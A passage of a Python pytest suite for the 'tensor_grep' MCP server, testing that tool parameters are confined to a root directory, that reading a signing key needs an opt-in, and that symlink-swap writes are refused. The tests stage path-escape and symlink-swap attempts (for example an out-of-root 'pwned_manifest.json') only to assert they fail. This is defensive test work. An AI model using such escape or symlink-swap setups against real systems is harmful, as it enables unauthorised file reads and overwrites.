    assert parsed.get("error", {}).get("code") == "invalid_input"
    assert not escape.exists()


# --- round-5 security: tg_rewrite_apply audit_manifest confinement + consume-resolved,
# audit_signing_key opt-in gate, and O_NOFOLLOW-guarded in-process writes (TOCTOU fix) -----
#
# tg_rewrite_apply's audit_manifest was entirely unconfined (an arbitrary MCP-reachable
# file-write primitive), and the round-4 write-path confinement that DID exist for
# write_baseline/write_suppressions/output_path validated a resolved Path then discarded
# it, forwarding the raw candidate string to the downstream consumer (TOCTOU: the
# validated location and the written location could diverge). This block covers: (1) the
# audit_manifest escape refusal, (2) the audit_signing_key opt-in gate, (3) a confined
# audit_manifest is still written for a rewrite target in a different directory, and (4)
# the O_NOFOLLOW symlink-swap refusal on the in-process ruleset-scan writers, guarding the
# O_TRUNC-not-O_EXCL re-run/overwrite semantics.


def test_rewrite_apply_refuses_audit_manifest_escape(tmp_path, monkeypatch):
    """FAILS pre-fix (audit_manifest unconfined at _build_rewrite_command call site);
    PASSES post-fix (Part A: confined to cwd, refused before any subprocess spawn)."""
    from tensor_grep.cli import mcp_server

    cwd = tmp_path / "proj"
    (cwd / "sub").mkdir(parents=True)
    (cwd / "sub" / "a.py").write_text("foo = 1\n", encoding="utf-8")
    monkeypatch.chdir(cwd)  # cwd is the anchor
    outside = tmp_path / "escape"
    outside.mkdir()
    escaped = outside / "pwned_manifest.json"  # absolute, outside cwd AND outside target
    payload_json, exit_code = mcp_server.execute_rewrite_apply_json(
        pattern="foo",
        replacement="bar",
        lang="python",
        path=str(cwd / "sub"),
        audit_manifest=str(escaped),
    )
    payload = json.loads(payload_json)
    assert exit_code == 1
    assert payload.get("error", {}).get("code") == "invalid_input"
    assert not escaped.exists()  # subprocess never spawned


def test_rewrite_apply_refuses_audit_signing_key_without_opt_in(tmp_path, monkeypatch):
    """FAILS pre-fix (audit_signing_key forwarded to the native binary unconditionally,
    an arbitrary-file-read-as-HMAC-key primitive); PASSES post-fix (Part A: refused with
    code=unsupported_option unless TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ=1)."""
    from tensor_grep.cli import mcp_server

    cwd = tmp_path / "proj"
    cwd.mkdir()
    (cwd / "a.py").write_text("foo = 1\n", encoding="utf-8")
    monkeypatch.chdir(cwd)
    monkeypatch.delenv("TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ", raising=False)
    secret = tmp_path / "outside-secret.key"
    secret.write_text("hmac-secret\n", encoding="utf-8")

    with patch("tensor_grep.cli.mcp_server.subprocess.run") as mock_run:
        payload_json, exit_code = mcp_server.execute_rewrite_apply_json(
            pattern="foo",
            replacement="bar",
            lang="python",
            path=str(cwd),
            audit_signing_key=str(secret),
        )
        mock_run.assert_not_called()  # refused before any subprocess spawn

    payload = json.loads(payload_json)
    assert exit_code == 1
    assert payload.get("error", {}).get("code") == "unsupported_option"


def test_rewrite_apply_writes_confined_audit_manifest(tmp_path, monkeypatch):
    """A confined audit_manifest under cwd must still be written for a rewrite target in
    a DIFFERENT directory (guards the anchor from over-restricting to the rewrite path)."""
    from tensor_grep.cli import mcp_server

    cwd = tmp_path / "proj"
    (cwd / "sub").mkdir(parents=True)
    (cwd / "sub" / "a.py").write_text("foo = 1\n", encoding="utf-8")
    monkeypatch.chdir(cwd)
    audit_dir = cwd / "tg_audit"
    audit_dir.mkdir()
    manifest = audit_dir / "manifest.json"  # UNDER the cwd anchor
    resolved_manifest = manifest.resolve()

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "audit_manifest": {
            "path": str(resolved_manifest),
            "file_count": 1,
            "applied_edit_count": 1,
            "signed": False,
            "signature_kind": None,
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }
    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"], returncode=0, stdout=json.dumps(payload), stderr=""
            ),
        ) as mock_run,
    ):
        _payload_json, exit_code = mcp_server.execute_rewrite_apply_json(
            pattern="foo",
            replacement="bar",
            lang="python",
            path=str(cwd / "sub"),  # rewrite target != cwd, legit
            audit_manifest=str(manifest),
        )

    assert exit_code == 0
    # the RESOLVED absolute path reached the native argv, not the raw candidate string.
    assert "--audit-manifest" in mock_run.call_args.args[0]
    idx = mock_run.call_args.args[0].index("--audit-manifest")
    assert mock_run.call_args.args[0][idx + 1] == str(resolved_manifest)


def test_write_json_refuse_symlink_refuses_swap(tmp_path):
    """Direct unit test of the Part-B in-process writer (main.py._write_json_refuse_symlink)
    shared by write_baseline and write_suppressions. FAILS pre-fix (plain
    write_path.write_text(...) blindly follows the symlink, silently overwriting whatever
    it points at); PASSES post-fix (refused via the is_symlink() pre-check -- authoritative
    on Windows, where os.O_NOFOLLOW is unavailable -- and via O_NOFOLLOW on POSIX; the
    outside target is left completely unchanged, not written through)."""
    from tensor_grep.cli import main as cli_main

    outside_target = tmp_path / "outside.json"
    outside_target.write_text("UNCHANGED\n", encoding="utf-8")
    link_path = tmp_path / "baseline.json"
    try:
        link_path.symlink_to(outside_target)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    with pytest.raises(ValueError):
        cli_main._write_json_refuse_symlink(link_path, {"fingerprints": ["x"]})
    assert outside_target.read_text(encoding="utf-8") == "UNCHANGED\n"


def test_ruleset_scan_write_baseline_refuses_symlink_swap_end_to_end(tmp_path, monkeypatch):
    """End-to-end: a pre-planted symlink at a confined write_baseline target is refused
    fail-closed through the full tg_ruleset_scan path (confinement resolve() +
    Part-B is_symlink()/O_NOFOLLOW both refuse it), and the symlink's outside target is
    left unchanged (not written through)."""
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    scan_root = tmp_path / "proj"
    scan_root.mkdir()
    monkeypatch.chdir(scan_root)

    (scan_root / "a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")
    outside_target = tmp_path / "outside-baseline.json"  # sibling of scan_root, still in tmp_path
    outside_target.write_text("UNCHANGED\n", encoding="utf-8")
    link_path = scan_root / "baseline.json"
    try:
        link_path.symlink_to(outside_target)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_ruleset_scan(
        "crypto-safe",
        path=".",
        language="python",
        write_baseline="baseline.json",
    )
    parsed = json.loads(out)
    assert parsed.get("error", {}).get("code") == "invalid_input"
    assert outside_target.read_text(encoding="utf-8") == "UNCHANGED\n"


def test_ruleset_scan_write_baseline_overwrites_on_rerun(monkeypatch, tmp_path):
    """A repeated write to the SAME write_baseline path must succeed and overwrite
    (guards O_CREAT|O_TRUNC|O_NOFOLLOW, not O_EXCL, which would fail the second run)."""
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")

    first = json.loads(
        mcp_server.tg_ruleset_scan(
            "crypto-safe", path=".", language="python", write_baseline="baseline.json"
        )
    )
    assert first.get("error") is None
    second = json.loads(
        mcp_server.tg_ruleset_scan(
            "crypto-safe", path=".", language="python", write_baseline="baseline.json"
        )
    )
    assert second.get("error") is None
    baseline_file = Path("baseline.json")
    written = json.loads(baseline_file.read_text(encoding="utf-8"))
    assert written["fingerprints"] == [first["findings"][0]["fingerprint"]]
    # round-5: the write lands under the validated anchor (scan_root == cwd here, path=".").
    assert baseline_file.resolve().parent == tmp_path.resolve()


# ============================================================================================
# round-8 ratchet (audit #95 gate-corrected version): every MCP tool's PRIMARY path/root
# param was UNCONFINED (only secondary params like manifest_path/baseline_path/policy were
# confined by the round-6/7 work above) -- an arbitrary-directory READ (and, on the rewrite/
# checkpoint family, WRITE) primitive reachable from any MCP client. `_mcp_root()`/
# `_confine_mcp_path()` (mcp_server.py) close this. This ratchet enumerates the LIVE
# registered schema (mcp.list_tools()), NOT a hand-maintained name-matched list like
# _READ_PATH_COVERAGE_CASES above -- a name-matched list only catches an escape on a param
# someone remembered to add a case for. A future tool with an unclassified string param
# (e.g. named "directory"/"target") FAILS this test until it is consciously confined (a real
# _confine_mcp_path/_confine_write_path/_confine_read_path call, plus a _RATCHET_BASE_KWARGS
# entry below) or allowlisted with a documented, genuinely-non-path reason.
# ============================================================================================

# Every string/string|None param NAME that is not a filesystem path, keyed by parameter name
# (not tool) since the same name means the same thing everywhere it appears in this file. Two
# exemption REASONS show up: (1) genuinely not a path (an identifier, pattern, or enum-like
# mode name); (2) deliberately gated by a DIFFERENT mechanism than path confinement (an
# operator opt-in env var) where confining it would be wrong, not a gap.
CONFINEMENT_EXEMPT: dict[str, str] = {
    "pattern": "a regex/literal search pattern, not a path",
    "query": "a free-text ranking query, not a path",
    "symbol": "an exact symbol name to resolve, not a path",
    "session_id": "an opaque session identifier, not a path",
    "lang": "a tree-sitter language name, not a path",
    "ruleset": "a built-in ruleset NAME resolved via resolve_rule_pack, not a path",
    "replacement": "a rewrite template string, not a path",
    "glob": "a glob pattern fragment (tg_search), not a path",
    "type_filter": "a file-type filter token e.g. 'py' (tg_search), not a path",
    "file_type": (
        "a file-type filter token e.g. 'py' (tg_ruleset_scan's sibling of type_filter), not a path"
    ),
    "language": "a ruleset language override name, not a path",
    "justification": "free-text audit-suppression rationale, not a path",
    "model": "a model name used for local token estimation, not a path",
    "provider": "a semantic-provider mode name (native/lsp/hybrid), not a path",
    "render_profile": "an enum-like render mode name (full/compact/llm), not a path",
    "inline_rules": (
        "a string of inline ast-grep rule YAML (tg_ruleset_scan, mirrors CLI --inline-rules), "
        "not a path -- parsed via _load_inline_rule_specs with zero file I/O; length-bounded "
        "by _MAX_INLINE_RULES_CHARS to blunt a YAML anchor/alias expansion-bomb before it ever "
        "reaches the parser"
    ),
    "signing_key": (
        "a READ of secret HMAC key material, deliberately gated by the "
        "TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ opt-in env var instead of path confinement -- "
        "operators legitimately keep HMAC keys outside the repo (e.g. ~/.config)"
    ),
    "audit_signing_key": (
        "tg_rewrite_apply's sibling of signing_key above; same opt-in-env-var gate, not "
        "path confinement"
    ),
    "checkpoint_id": "an opaque checkpoint identifier, not a path",
    "expected_plan_digest": "a hex content digest from a prior tg_rewrite_plan call, not a path",
    "lint_cmd": (
        "a shell command string, refused outright unless TG_MCP_ALLOW_VALIDATION_COMMANDS=1 "
        "(a stronger, independent gate) -- not a path, and not confinable as one"
    ),
    "test_cmd": "tg_rewrite_apply's sibling of lint_cmd above; same validation-commands gate",
    # #98 (MCP consolidation Phase-1): the 10 meta-tools' shared dispatch selector -- an
    # enum-like action name (e.g. "defs"/"scan"/"apply"), never a path.
    "action": "the meta-tool's dispatch action selector (e.g. 'defs'/'scan'/'apply'), not a path",
}

# Minimal valid kwargs per tool so a targeted param's confinement check is actually REACHED
# during the test call instead of short-circuiting on an earlier missing-required-arg or
# unrelated validation error. None of these values need to exist on disk -- confinement is
# pure path resolution/ancestry, never an existence check -- except where a tool's OWN
# downstream loader reads the file directly with no FileNotFoundError guard (see
# _ratchet_positive_value below for the two params that need a real file).
_RATCHET_BASE_KWARGS: dict[str, dict[str, object]] = {
    "tg_ruleset_scan": {"ruleset": "secrets-basic", "path": "."},
    "tg_repo_map": {"path": "."},
    "tg_orient": {"path": "."},
    "tg_doctor": {"path": "."},
    "tg_context_pack": {"query": "x", "path": "."},
    "tg_edit_plan": {"query": "x", "path": "."},
    "tg_context_render": {"query": "x", "path": "."},
    "tg_agent_capsule": {"query": "x", "path": "."},
    "tg_session_edit_plan": {"session_id": "nonexistent-session", "query": "x", "path": "."},
    "tg_session_context_render": {
        "session_id": "nonexistent-session",
        "query": "x",
        "path": ".",
    },
    "tg_session_blast_radius": {
        "session_id": "nonexistent-session",
        "symbol": "Foo",
        "path": ".",
    },
    "tg_session_file_importers": {
        "session_id": "nonexistent-session",
        "file": "dummy.py",
        "path": ".",
    },
    "tg_symbol_blast_radius_plan": {"symbol": "Foo", "path": "."},
    "tg_session_blast_radius_render": {
        "session_id": "nonexistent-session",
        "symbol": "Foo",
        "path": ".",
    },
    "tg_session_blast_radius_plan": {
        "session_id": "nonexistent-session",
        "symbol": "Foo",
        "path": ".",
    },
    "tg_symbol_defs": {"symbol": "Foo", "path": "."},
    "tg_symbol_source": {"symbol": "Foo", "path": "."},
    "tg_symbol_impact": {"symbol": "Foo", "path": "."},
    "tg_symbol_refs": {"symbol": "Foo", "path": "."},
    "tg_symbol_callers": {"symbol": "Foo", "path": "."},
    "tg_file_imports": {"file": "dummy.py"},
    "tg_file_importers": {"file": "dummy.py", "path": "."},
    "tg_symbol_blast_radius": {"symbol": "Foo", "path": "."},
    "tg_symbol_blast_radius_render": {"symbol": "Foo", "path": "."},
    "tg_search": {"pattern": "x", "path": "."},
    "tg_ast_search": {"pattern": "x", "lang": "python", "path": "."},
    "tg_find": {"query": "x", "path": "."},
    "tg_classify_logs": {"file_path": "dummy.log"},
    "tg_index_search": {"pattern": "x", "path": "."},
    "tg_rewrite_plan": {"pattern": "x", "replacement": "y", "lang": "python", "path": "."},
    "tg_rewrite_apply": {"pattern": "x", "replacement": "y", "lang": "python", "path": "."},
    "tg_audit_manifest_verify": {"manifest_path": "manifest.json"},
    "tg_audit_history": {"path": "."},
    "tg_audit_diff": {
        "previous_manifest": "previous.json",
        "current_manifest": "current.json",
    },
    "tg_review_bundle_create": {"manifest_path": "manifest.json"},
    "tg_review_bundle_verify": {"bundle_path": "bundle.json"},
    "tg_checkpoint_create": {"path": "."},
    "tg_checkpoint_list": {"path": "."},
    "tg_checkpoint_undo": {"checkpoint_id": "cp-1", "path": "."},
    "tg_session_open": {"path": "."},
    "tg_session_list": {"path": "."},
    "tg_session_show": {"session_id": "nonexistent-session", "path": "."},
    "tg_session_refresh": {"session_id": "nonexistent-session", "path": "."},
    "tg_session_context": {"session_id": "nonexistent-session", "query": "x", "path": "."},
    "tg_rewrite_diff": {"pattern": "x", "replacement": "y", "lang": "python", "path": "."},
    # #98 (MCP consolidation Phase-1): the 10 meta-tools. Every meta tool confines its PRIMARY
    # path/root param -- and most other declared path-shaped params -- UNCONDITIONALLY at the
    # top (before the action branch), so -- unlike the legacy tools above, where the chosen
    # action sometimes matters for reachability -- a single fixed `action` here reaches
    # confinement for almost every non-exempt string param on that tool's schema regardless of
    # which action it belongs to. TWO EXCEPTIONS: tg_scan's baseline_path/write_baseline/
    # suppressions_path/write_suppressions and tg_rewrite's audit_manifest/policy are confined
    # by the DELEGATED legacy function (tg_ruleset_scan / execute_rewrite_apply_json, the latter
    # reached via tg_rewrite_apply) before any filesystem op, not by this meta layer -- load-
    # bearing, not redundant, which is why the fixed action below is deliberately "scan"/"apply"
    # (the one action each actually dispatches through) so this ratchet still reaches them.
    "tg_navigate": {"action": "imports", "file": "dummy.py", "path": "."},
    "tg_impact": {"action": "impact", "symbol": "Foo", "path": "."},
    "tg_query": {"action": "text", "pattern": "x", "path": "."},
    "tg_context": {"action": "pack", "query": "x", "path": "."},
    "tg_explore": {"action": "orient", "path": "."},
    "tg_session": {
        "action": "file_importers",
        "session_id": "nonexistent-session",
        "file": "dummy.py",
        "path": ".",
    },
    "tg_scan": {"action": "scan", "ruleset": "secrets-basic", "path": "."},
    "tg_audit": {"action": "manifest_verify", "manifest_path": "manifest.json", "path": "."},
    "tg_checkpoint": {"action": "list", "path": "."},
    "tg_rewrite": {
        "action": "apply",
        "pattern": "x",
        "replacement": "y",
        "lang": "python",
        "path": ".",
    },
}


def _tool_string_param_names(tool) -> list[str]:
    """Every param name in `tool`'s live input schema typed `str` or `str | None`."""
    properties = tool.inputSchema.get("properties", {})
    names = []
    for param_name, schema in properties.items():
        types_seen = set()
        if "type" in schema:
            types_seen.add(schema["type"])
        for sub in schema.get("anyOf", ()):
            if "type" in sub:
                types_seen.add(sub["type"])
        if "string" in types_seen:
            names.append(param_name)
    return names


def _enumerate_confinement_ratchet_cases() -> list[tuple[str, str]]:
    """(tool_name, param_name) for every non-exempt string param on every registered tool."""
    from tensor_grep.cli import mcp_server

    cases: list[tuple[str, str]] = []
    for tool in asyncio.run(mcp_server.mcp.list_tools()):
        for param_name in _tool_string_param_names(tool):
            if param_name in CONFINEMENT_EXEMPT:
                continue
            cases.append((tool.name, param_name))
    return sorted(cases)


_CONFINEMENT_RATCHET_CASES = _enumerate_confinement_ratchet_cases()


def _ratchet_positive_value(tool_name: str, param_name: str, root: Path) -> str:
    """The 'valid in-root' value for a (tool, param) ratchet case.

    Defaults to a nonexistent in-root relative name -- confinement never requires
    existence, and every tool's OWN not-found handling for that param is already covered
    by its existing tests. Two params are special-cased: tg_ruleset_scan's baseline_path/
    suppressions_path loaders (`_load_ruleset_baseline`/`_load_ruleset_suppressions` in
    cli/main.py) call `.read_text()` directly with no FileNotFoundError guard in
    tg_ruleset_scan's own except clauses (only ValueError/BroadScanRefusedError are caught
    there), so a missing file would raise past this test instead of exercising the
    confinement layer -- pre-create a minimal valid file for those two. `tg_scan` (#98)
    dispatches action="scan" straight to `tg_ruleset_scan`, so it inherits the identical
    need whenever its OWN baseline_path/suppressions_path ratchet case is exercised.
    """
    if param_name == "path":
        return "."
    if tool_name in {"tg_ruleset_scan", "tg_scan"} and param_name == "baseline_path":
        (root / "ratchet_baseline.json").write_text(
            json.dumps({"fingerprints": []}), encoding="utf-8"
        )
        return "ratchet_baseline.json"
    if tool_name in {"tg_ruleset_scan", "tg_scan"} and param_name == "suppressions_path":
        (root / "ratchet_suppressions.json").write_text(json.dumps({}), encoding="utf-8")
        return "ratchet_suppressions.json"
    return "ratchet_ok_target"


@pytest.mark.parametrize(
    "tool_name,param_name",
    _CONFINEMENT_RATCHET_CASES,
    ids=[f"{t}.{p}" for t, p in _CONFINEMENT_RATCHET_CASES],
)
def test_mcp_primary_path_confinement_ratchet(
    tool_name, param_name, tmp_path, tmp_path_factory, monkeypatch
):
    """Every non-exempt string param on every registered MCP tool must reject an
    out-of-root candidate AND accept an in-root one (audit #95 gate-corrected ratchet).

    Schema-driven (mcp.list_tools()), not a hand-maintained name-matched list: a NEW tool
    with an unclassified string param fails here (or errors loudly via the assertion
    below) until it is consciously confined or added to CONFINEMENT_EXEMPT with a reason.
    """
    # #102 fold-in (ratchet hermeticity): without this, a REAL TG_MCP_ROOT set in the
    # operator's/CI's own shell environment (not just a monkeypatch-scoped one from another
    # test -- pytest's monkeypatch fixture already auto-reverts those) would silently relocate
    # the confinement anchor away from tmp_path below, so the negative probe's "outside_dir"
    # might land INSIDE the real TG_MCP_ROOT and false-pass, or the positive probe's in-root
    # relative value might land OUTSIDE it and false-fail -- a "passes in CI, false result
    # locally" trap. Hermetic tests must not depend on ambient external environment state.
    monkeypatch.delenv("TG_MCP_ROOT", raising=False)
    monkeypatch.chdir(tmp_path)
    assert tool_name in _RATCHET_BASE_KWARGS, (
        f"{tool_name} has a non-exempt string param {param_name!r} this ratchet does not "
        "know how to reach. Either confine it (_confine_mcp_path for a primary path/root "
        "param, _confine_write_path/_confine_read_path for a secondary one) and add a "
        "_RATCHET_BASE_KWARGS entry, or add it to CONFINEMENT_EXEMPT with a reason if it "
        "is genuinely not a path."
    )
    base_kwargs = dict(_RATCHET_BASE_KWARGS[tool_name])

    outside_dir = tmp_path_factory.mktemp("ratchet_outside")

    # --- negative: an out-of-root candidate must be refused, fail-closed, structured.
    rejected = _call_mcp_tool_text(tool_name, {**base_kwargs, param_name: str(outside_dir)})
    assert "must stay within" in rejected, (
        f"{tool_name}.{param_name} accepted an out-of-root path without rejecting it "
        f"(response: {rejected[:500]!r}). Confine it via _confine_mcp_path (primary path/"
        "root param) or _confine_write_path/_confine_read_path (secondary param), or add "
        "it to CONFINEMENT_EXEMPT above if it is genuinely not a path."
    )
    try:
        rejected_payload = json.loads(rejected)
    except json.JSONDecodeError:
        rejected_payload = None
    if isinstance(rejected_payload, dict) and isinstance(rejected_payload.get("error"), dict):
        assert rejected_payload["error"].get("code") == "invalid_input"

    # --- positive: an in-root candidate must NOT trip the confinement check. Bidirectional
    # on purpose -- the negative case alone only proves *some* rejection fires; it would
    # stay green even if confinement were entirely absent, as long as some OTHER error
    # happened to fire for an out-of-root value. This half proves the "must stay within"
    # signal specifically tracks confinement, not noise.
    positive_value = _ratchet_positive_value(tool_name, param_name, tmp_path)
    try:
        accepted = _call_mcp_tool_text(tool_name, {**base_kwargs, param_name: positive_value})
    except Exception as exc:
        # A tool may fail for a NON-confinement reason on a given runner: e.g. the ast-grep /
        # tree-sitter deps are absent (Linux CI without ast-grep), so an ast-backed tool
        # (tg_ast_search, tg_ruleset_scan, ...) raises a wrapped ToolError BEFORE it would run.
        # That is NOT a confinement rejection -- confinement rejections RETURN structured text
        # (see the negative probe above), they never raise. So a raised error still satisfies
        # the positive half (the anchor did not reject the in-root path); assert only that it is
        # not specifically the confinement "must stay within" signal.
        accepted = str(exc)
    assert "must stay within" not in accepted, (
        f"{tool_name}.{param_name} rejected an in-root path as if it were out-of-root "
        f"(response: {accepted[:500]!r}); the confinement anchor is probably wrong."
    )


def test_confinement_exempt_allowlist_has_no_unused_entries():
    """Every CONFINEMENT_EXEMPT entry must correspond to a real param somewhere in the live
    schema -- otherwise a stale allowlist entry could mask a real future gap. (inline_rules
    shipped as a real tg_ruleset_scan param in audit #95 Part 2; no forward-looking
    reservation remains.)"""
    from tensor_grep.cli import mcp_server

    all_param_names: set[str] = set()
    for tool in asyncio.run(mcp_server.mcp.list_tools()):
        all_param_names.update(tool.inputSchema.get("properties", {}))

    stale = set(CONFINEMENT_EXEMPT) - all_param_names
    assert not stale, f"CONFINEMENT_EXEMPT has stale/unused entries: {sorted(stale)}"


def test_mcp_root_defaults_to_cwd(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_ROOT", raising=False)
    monkeypatch.chdir(tmp_path)

    assert mcp_server._mcp_root() == tmp_path.resolve()


def test_mcp_root_empty_env_treated_as_unset(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_MCP_ROOT", "")
    monkeypatch.chdir(tmp_path)

    assert mcp_server._mcp_root() == tmp_path.resolve()


def test_mcp_root_whitespace_env_treated_as_unset(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_MCP_ROOT", "   ")
    monkeypatch.chdir(tmp_path)

    assert mcp_server._mcp_root() == tmp_path.resolve()


def test_mcp_root_honors_valid_override(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    override = tmp_path / "override-root"
    override.mkdir()
    monkeypatch.setenv("TG_MCP_ROOT", str(override))

    assert mcp_server._mcp_root() == override.resolve()


def test_mcp_root_falls_back_to_cwd_on_nonexistent_override(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    missing = tmp_path / "does-not-exist"
    monkeypatch.setenv("TG_MCP_ROOT", str(missing))
    cwd = tmp_path / "cwd"
    cwd.mkdir()
    monkeypatch.chdir(cwd)

    assert mcp_server._mcp_root() == cwd.resolve()


def test_mcp_root_falls_back_to_cwd_when_override_is_a_file(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    a_file = tmp_path / "not-a-dir.txt"
    a_file.write_text("x", encoding="utf-8")
    monkeypatch.setenv("TG_MCP_ROOT", str(a_file))
    cwd = tmp_path / "cwd"
    cwd.mkdir()
    monkeypatch.chdir(cwd)

    assert mcp_server._mcp_root() == cwd.resolve()


def test_confine_mcp_path_uses_mcp_root_override(tmp_path, monkeypatch):
    """TG_MCP_ROOT relocates the primary-path confinement anchor for a real tool call --
    a path outside cwd but inside the configured override must now be ACCEPTED."""
    from tensor_grep.cli import mcp_server

    cwd = tmp_path / "cwd"
    cwd.mkdir()
    override_root = tmp_path / "fleet-root"
    other_repo = override_root / "other-repo"
    other_repo.mkdir(parents=True)
    monkeypatch.setenv("TG_MCP_ROOT", str(override_root))
    monkeypatch.chdir(cwd)

    # other_repo is outside cwd but inside the TG_MCP_ROOT override -- must be accepted.
    out = mcp_server.tg_repo_map(str(other_repo))
    parsed = json.loads(out)
    assert parsed.get("error") is None

    # A path outside the override entirely must still be refused.
    outside_override = tmp_path / "outside-override"
    outside_override.mkdir()
    refused = mcp_server.tg_repo_map(str(outside_override))
    refused_parsed = json.loads(refused)
    assert refused_parsed["error"]["code"] == "invalid_input"
    assert "must stay within" in refused_parsed["error"]["message"]


# #102 fold-in: the 13 round-6/7 params `_confine_mcp_path`'s docstring names as a residual
# cwd-hardcoded set (tg_file_imports/importers `file`, tg_classify_logs `file_path`, the
# tg_audit_*/tg_review_bundle_* manifest/bundle params, tg_rewrite_apply `audit_manifest`) now
# route through `_mcp_root()` too, so TG_MCP_ROOT relocates them exactly like every primary
# path/root param. (tool_name, param_name, base_kwargs) -- base_kwargs supplies every OTHER
# required param with a value that either doesn't need to exist on disk (confinement is pure
# path resolution) or is pre-created in the test body when the tool's own loader reads it
# directly (mirrors _RATCHET_BASE_KWARGS / _ratchet_positive_value above).
_ANCHOR_SPLIT_CASES: list[tuple[str, str, dict[str, object]]] = [
    ("tg_file_imports", "file", {}),
    ("tg_file_importers", "file", {"path": "."}),
    ("tg_classify_logs", "file_path", {}),
    ("tg_audit_manifest_verify", "manifest_path", {}),
    ("tg_audit_manifest_verify", "previous_manifest", {"manifest_path": "manifest.json"}),
    ("tg_audit_diff", "previous_manifest", {"current_manifest": "current.json"}),
    ("tg_audit_diff", "current_manifest", {"previous_manifest": "previous.json"}),
    ("tg_review_bundle_create", "manifest_path", {}),
    ("tg_review_bundle_create", "scan_path", {"manifest_path": "manifest.json"}),
    ("tg_review_bundle_create", "previous_manifest", {"manifest_path": "manifest.json"}),
    ("tg_review_bundle_create", "output_path", {"manifest_path": "manifest.json"}),
    ("tg_review_bundle_verify", "bundle_path", {}),
    (
        "tg_rewrite_apply",
        "audit_manifest",
        {"pattern": "x", "replacement": "y", "lang": "python", "path": "."},
    ),
]


@pytest.mark.parametrize(
    "tool_name,param_name,base_kwargs",
    _ANCHOR_SPLIT_CASES,
    ids=[f"{t}.{p}" for t, p, _ in _ANCHOR_SPLIT_CASES],
)
def test_round8_residual_cwd_params_move_with_tg_mcp_root(
    tool_name, param_name, base_kwargs, tmp_path, monkeypatch
):
    """The residual params still hardcoded to Path.cwd() as of the #95 gate report must be
    fixed to anchor at _mcp_root() -- an operator who relocates TG_MCP_ROOT to point an MCP
    server at a fleet repo other than its own cwd must get the SAME relocated confinement on
    these params as every primary path/root param already gets."""
    real_root = tmp_path / "real_root"
    real_root.mkdir()
    other_cwd = tmp_path / "other_cwd"
    other_cwd.mkdir()

    monkeypatch.setenv("TG_MCP_ROOT", str(real_root))
    monkeypatch.chdir(other_cwd)  # cwd != TG_MCP_ROOT so a leftover cwd anchor is caught.

    # ABSOLUTE path, not relative: a bare relative filename resolves safely under ANY anchor
    # (anchor / "target.json" always stays "within" whatever the anchor happens to be), so it
    # cannot distinguish the old Path.cwd()-anchored behavior from the fixed _mcp_root()
    # behavior. An absolute path inside real_root but outside other_cwd can: it is only
    # accepted when the anchor is really real_root (mirrors test_confine_mcp_path_uses_
    # mcp_root_override's own absolute-path probe style above).
    in_root_target = real_root / "target.json"
    in_root_target.write_text("{}", encoding="utf-8")

    kwargs = {**base_kwargs, param_name: str(in_root_target)}
    result = _call_mcp_tool_text(tool_name, kwargs)

    assert "must stay within" not in result, (
        f"{tool_name}.{param_name} rejected a path inside TG_MCP_ROOT while cwd differed from "
        f"TG_MCP_ROOT -- still anchored to Path.cwd() instead of _mcp_root() "
        f"(response: {result[:400]!r})"
    )

    # And a path outside BOTH cwd and TG_MCP_ROOT must still be refused -- this proves the
    # positive case above is really exercising confinement, not an accidental no-op check.
    outside = tmp_path / "outside_both"
    outside.mkdir()
    (outside / "target.json").write_text("{}", encoding="utf-8")
    rejected = _call_mcp_tool_text(
        tool_name, {**base_kwargs, param_name: str(outside / "target.json")}
    )
    assert "must stay within" in rejected, (
        f"{tool_name}.{param_name} accepted a path outside TG_MCP_ROOT (response: "
        f"{rejected[:400]!r})"
    )


# ================================================================================================
# #98 (MCP consolidation Phase-1): the 10 additive task-shaped meta-tools.
#   - Ratchet B (plural path ratchet): schema-driven, mirrors the string ratchet A above but
#     for array<string> params -- `_tool_string_param_names` only matches `type=="string"`, so
#     an array-of-strings path param (today, only tg_query's `workspace_roots`) is invisible to
#     ratchet A and needs its own coverage (must-fix 3).
#   - The flag-OFF invariant, proven via SUBPROCESS isolation, not `importlib.reload` (must-fix 2).
#   - Per-meta dispatch tests (monkeypatch-spy the legacy fn, assert forwarded args).
#   - Fail-closed-class preservation (native-unavailable, validation-command gating).
# ================================================================================================

# Plural (array<string>) path params, keyed by param name -- the array counterpart of
# CONFINEMENT_EXEMPT above. `ignore` (tg_orient / tg_explore) is a glob-pattern list used to
# EXCLUDE files from centrality ranking, not a location to read/write -- confining it would
# incorrectly demand it be an in-root path.
PLURAL_CONFINEMENT_EXEMPT: dict[str, str] = {
    "ignore": "a glob-pattern list (tg_orient/tg_explore), excludes files, not a path to confine",
}

# Minimal valid kwargs per meta tool so a targeted plural param's confinement check is
# actually reached (mirrors _RATCHET_BASE_KWARGS above, scoped to the meta tools that declare
